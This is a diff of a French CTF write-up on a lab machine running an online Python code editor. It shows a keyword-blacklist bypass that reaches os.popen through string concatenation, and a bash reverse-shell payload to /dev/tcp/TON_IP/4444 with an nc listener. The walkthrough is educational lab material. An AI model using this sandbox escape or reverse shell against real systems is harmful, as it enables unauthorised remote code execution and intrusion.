@@ -429,24 +429,158 @@ Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de r
 
 L’énumération met en évidence une surface d’attaque réduite, avec uniquement le port **22 (SSH)** et une application web exposée sur le port **5000**.
 
-Le scan CMS n’a révélé aucune technologie connue, ce qui permet d’écarter l’hypothèse d’un CMS standard.
- Par ailleurs, le service web utilise **Gunicorn 20.0.4**, indiquant un backend Python (Flask, Django ou application équivalente).
+Le scan CMS n’a révélé aucune technologie connue, ce qui permet d’écarter l’hypothèse d’un CMS standard. 
 
-Ces éléments orientent l’analyse vers une application spécifique, dont le comportement doit être étudié en détail.
- L’approche commence donc par une exploration de l’interface web depuis ton navigateur, afin d’identifier les fonctionnalités disponibles et les éventuels points d’entrée exploitables.
+Par ailleurs, le service web utilise **Gunicorn 20.0.4**, indiquant un backend Python (Flask, Django ou application équivalente).
+
+Ces éléments orientent l’analyse vers une application spécifique, dont le comportement doit être étudié en détail.  
+
+L’approche commence donc par une exploration de l’interface web depuis ton navigateur, afin d’identifier les fonctionnalités disponibles et les éventuels points d’entrée exploitables.
+
+
 
 ![Interface web d’un éditeur de code Python en ligne sur code.htb:5000 avec boutons Run/Save et exécution côté serveur](python-code-editor.png)
 
-Une tentative d’accès au système via `import os` est bloquée par un message indiquant l’utilisation de mots-clés restreints.
+### Exploration de l’interface web
 
-Cela suggère la présence d’un mécanisme de filtrage côté application, probablement basé sur une blacklist.
+L’application se présente comme un éditeur de code Python en ligne, accessible sans authentification.
 
-Ce type de protection étant souvent contournable, l’objectif devient alors de bypass ce filtrage pour accéder aux fonctionnalités système.
+Plusieurs sections sont disponibles dans le menu :
 
-Le filtrage ne bloque pas réellement les capacités Python disponibles : il bloque seulement certaines chaînes de caractères dans le code soumis.
+- **About**
 
-L’appel à `globals()` révèle que le module `os` est déjà chargé dans le contexte de l’application Flask.  
-Il devient alors possible d’y accéder indirectement sans écrire le mot interdit en clair.
+<img src="about-code.png" alt="Page About de l’application code.htb présentant un éditeur Python en ligne" class="img-left">
+
+
+
+- **Register**
+
+<img src="register.png" alt="Formulaire d’inscription de l’application code.htb avec création de compte utilisateur" class="img-left">
+
+- **Login**
+
+<img src="login.png" alt="Page de connexion de l’application code.htb permettant l’accès utilisateur" class="img-left">
+
+
+
+L’exploration de ces pages ne révèle pas de fonctionnalité exploitable directement, et les mécanismes d’inscription et d’authentification n’apportent pas d’indice particulier à ce stade.
+
+L’interface principale repose sur deux actions :
+
+\- **Run** : exécuter le code Python
+\- **Save** : enregistrer un script
+
+Un premier test avec un code minimal permet de valider le fonctionnement :
+
+```python
+print("Hello, world!")
+```
+
+Le résultat s’affiche immédiatement dans le panneau de droite, ce qui confirme que le code est exécuté côté serveur.
+
+La fonctionnalité **Save** demande un nom de script, mais nécessite une authentification pour être utilisée. 
+
+Elle n’apporte donc pas de piste exploitable dans ce contexte.
+
+En revanche, l’exécution via **Run** constitue un point d’entrée direct vers le backend.
+
+En testant différentes instructions Python, tu observes rapidement que certaines commandes sont bloquées avec le message :
+
+```
+Use of restricted keywords is not allowed.
+```
+
+Cela indique la présence d’un mécanisme de filtrage côté application.
+
+Ces premiers constats orientent clairement l’analyse : l’application exécute du code Python côté serveur, mais tente d’en restreindre l’usage via un filtrage de mots-clés.
+
+L’objectif devient alors de contourner ce filtrage afin de transformer cette exécution en exécution de commandes système.
+
+La démarche classique consiste à exploiter l’environnement Python déjà chargé en mémoire via `globals()`, puis à identifier si des modules sensibles comme `os` sont accessibles.  
+
+Si c’est le cas, des fonctions comme `popen()` permettent d’exécuter des commandes système et d’en récupérer la sortie.
+
+Le chemin logique devient donc :
+
+`globals()` → `os` → `popen()` → exécution de commande → reverse shell
+
+------
+
+### Analyse du filtrage et exploitation
+
+L’objectif devient alors de comprendre ce qui est filtré, et surtout comment contourner ces restrictions.
+
+Plutôt que d’importer directement des modules (ce qui est bloqué), tu explores l’environnement Python déjà chargé en mémoire via `globals()` :
+
+```python
+print(globals().keys())
+```
+
+Cette approche permet d’identifier les objets accessibles sans passer par un `import`.
+
+Tu constates notamment la présence du module `os`, ce qui ouvre la voie à une exécution de commandes système.
+
+Une tentative directe échoue :
+
+```python
+import os
+os.popen("id").read()
+```
+
+Le filtrage bloque :
+
+- `os`
+- `popen`
+
+Tu passes alors à une approche classique de contournement en reconstruction dynamique des chaînes :
+
+```
+m = globals()['o'+'s']
+p = getattr(m, 'po'+'pen')('id')
+print(getattr(p, 're'+'ad')())
+```
+
+Cette technique permet de :
+
+- éviter les mots-clés filtrés (`os`, `popen`, `read`)
+- accéder dynamiquement aux fonctions sensibles
+- exécuter une commande système
+
+Le résultat de la commande `id` s’affiche correctement, ce qui confirme que :
+
+- le code est exécuté côté serveur
+- l’accès au système est possible
+- le filtrage est uniquement basé sur des mots-clés
+
+Tu disposes donc d’une **RCE (Remote Code Execution)** exploitable.
+
+------
+
+### Obtention d’un reverse shell
+
+Une fois la RCE confirmée, l’objectif est d’obtenir un accès interactif à la machine.
+
+Tu remplaces la commande utilisée précédemment par un reverse shell :
+
+```
+m = globals()['o'+'s']
+p = getattr(m, 'po'+'pen')("bash -c 'bash -i >& /dev/tcp/TON_IP/4444 0>&1'")
+print(getattr(p, 're'+'ad')())
+```
+
+Sur ta machine Kali, tu démarres un listener :
+
+```
+rlwrap -cAr nc -lvnp 4444
+```
+
+Dès l’exécution du code via le bouton **Run**, la machine cible initie une connexion vers ton listener.
+
+Tu obtiens ainsi un shell sur le système distant.
+
+
+
+
 
 
 
